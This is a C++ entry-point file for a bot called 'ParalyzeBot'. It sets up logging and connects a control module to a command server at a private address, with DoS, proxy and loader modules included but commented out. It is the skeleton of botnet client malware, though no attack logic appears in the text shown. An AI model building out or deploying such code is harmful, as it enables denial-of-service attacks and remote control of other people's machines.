#include "ControlModule.h"
#include "DoSModule.h"
#include "ProxyModule.h"
#include "LoaderModule.h"
#include <chrono>
#include <iostream>
#include <thread>

void print_collection_string() {
  std::string log_collection = "";
  while (true) {
    if (log_collection !=
        BotLogger::getInstance().get_log_collection_string()) {
      log_collection = BotLogger::getInstance().get_log_collection_string();
      std::cout << log_collection << std::flush;
      std::cout << "\r";
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
  }
}

int main() {
  try {
    std::cout << "[i] Starting ParalyzeBot..." << std::endl;
    std::cout << "[i] Setting log level to TRACE..." << std::endl;
    BotLogger::getInstance().set_log_level(LogLevel::TRACE);
    std::cout << "[i] Starting log thread..." << std::endl;
    std::thread log_thread(print_collection_string);
    log_thread.detach();
    const std::string server_address = "10.0.10.1";
    int server_port = 5050;

    std::cout << "[i] Creating control module..." << std::endl;
    ControlModule *control_module =
        new ControlModule(server_address, server_port);
        /*
    std::cout << "[i] Creating loader module..." << std::endl;
    IModule *loader_module = new LoaderModule(server_address, server_port);
    std::cout << "[i] Creating DoS module..." << std::endl;
    IModule *dos_module = new DoSModule();
    std::cout << "[i] Creating proxy module..." << std::endl;
    IModule *proxy_module = new ProxyModule();
    
       std::cout << "[i] Registering modules..." << std::endl;
    control_module->register_module(std::shared_ptr<IModule>(loader_module));
    std::cout << "[i] Registered module " << loader_module->get_module_name()
              << std::endl;
    control_module->register_module(std::shared_ptr<IModule>(dos_module));
    std::cout << "[i] Registered module " << dos_module->get_module_name()
              << std::endl;
    control_module->register_module(std::shared_ptr<IModule>(proxy_module));
    control_module->register_module(std::shared_ptr<IModule>(control_module));
    std::cout << "[i] Registered module " << control_module->get_module_name()
              << std::endl;
    */

    std::cout << "[i] Setting API endpoints..." << std::endl;
    nlohmann::json api_endpoints;
    api_endpoints = BotEssentials::getInstance().get_json_dump_from_file(
        "../../configs/api_endpoints.json");
    control_module->set_api_endpoints(api_endpoints);
    std::cout << "[i] Starting control module..." << std::endl;
    control_module->start_module();
    delete control_module;
    //delete loader_module;
    //delete dos_module;
  } catch (const std::exception &e) {
    std::cout << BotLogger::getInstance().get_log_collection_string()
              << std::endl;
  }

  return 0;
}